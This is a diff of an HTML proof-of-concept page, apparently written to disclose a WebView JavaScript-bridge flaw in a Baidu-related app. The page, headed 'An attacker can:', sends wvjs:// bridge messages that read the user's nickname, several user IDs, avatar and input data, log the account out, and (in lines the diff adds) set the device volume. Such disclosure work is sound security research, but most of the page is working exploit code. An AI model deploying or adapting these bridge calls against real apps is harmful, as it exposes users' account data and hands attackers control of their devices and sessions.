@@ -50,24 +50,25 @@
 
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
-    <p><span class="larger">Get Your Personal Info:</span></p>
-    <p style="font-size: 15px;" id="PhoneNumber"></p>
-    <p style="font-size: 15px;" id="CountryCode"></p>
-
     <p><span class="larger">Get Your Account Info:</span></p>
     <p style="font-size: 15px;" id="NickName"></p>
-    <p style="font-size: 15px;" id="UID"></p>
-    <p style="font-size: 15px;" id="CUID"></p>
-    <p style="font-size: 15px;" id="BaiduUID"></p>
-    <p style="font-size: 15px;" id="AGID"></p>
     <p style="font-size: 15px;" id="AccountAvatarText">Your Avatar: </p>
     <div class="image-with-text">
         <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
     </div>
+    <p style="font-size: 15px;" id="UID"></p>
+    <p style="font-size: 15px;" id="CUID"></p>
+    <p style="font-size: 15px;" id="BaiduUID"></p>
+    <p style="font-size: 15px;" id="AGID"></p>
     <p style="font-size: 15px;" id="InputNums"></p>
 
-    <p><span class="larger">Get Your Device Info:</span></p>
-    <p style="font-size: 15px;" id="DeviceID"></p>
+    <p><span class="larger">Set Your Volume:</span></p>
+    <input type="button" value="Set to 100% (max)" id="VolumeMax" style="font-size: 20px; padding: 20px 25px;"/>
+    </p>
+    <input type="button" value="Set to 50% (half)" id="VolumeHalf" style="font-size: 20px; padding: 20px 25px;"/>
+    </p>
+    <input type="button" value="Set to 0% (min)" id="VolumeMin" style="font-size: 20px; padding: 20px 25px;"/>
+
 
     <p><span class="larger">Log Out Your Account:</span></p>
     <input type="button" value="Log Out" id="LogOut" style="font-size: 20px; padding: 20px 25px;"/>
@@ -113,10 +114,8 @@
                 var userData = json.data.data;
                 document.getElementById("NickName").innerText = "Your NickName: " + userData.nick_name;
                 document.getElementById("InputNums").innerText = "Your InputNums: \n" + JSON.stringify(userData.date_items);
-            
                 document.getElementById("AccountAvatar").src = "data:image/png;base64," + decodeURIComponent(userData.profile_img);
                 break;
-
         }
     }
 
@@ -130,6 +129,15 @@
         fetchData('wvjs://__wvjs_has_message__?message={"name":"logout","data":{},"messageID":1,"callbackID":99}');
     }
 
+    document.getElementById("VolumeMax").onclick = function () {
+        fetchData('wvjs://__wvjs_has_message__?message={"name":"setVolume","data":{"volume":1},"messageID":1,"callbackID":100}');
+    }
+    document.getElementById("VolumeHalf").onclick = function () {
+        fetchData('wvjs://__wvjs_has_message__?message={"name":"setVolume","data":{"volume":0.5},"messageID":1,"callbackID":100}');
+    }    
+    document.getElementById("VolumeMin").onclick = function () {
+        fetchData('wvjs://__wvjs_has_message__?message={"name":"setVolume","data":{"volume":0},"messageID":1,"callbackID":100}');
+    }
     </script>
 
 </body>
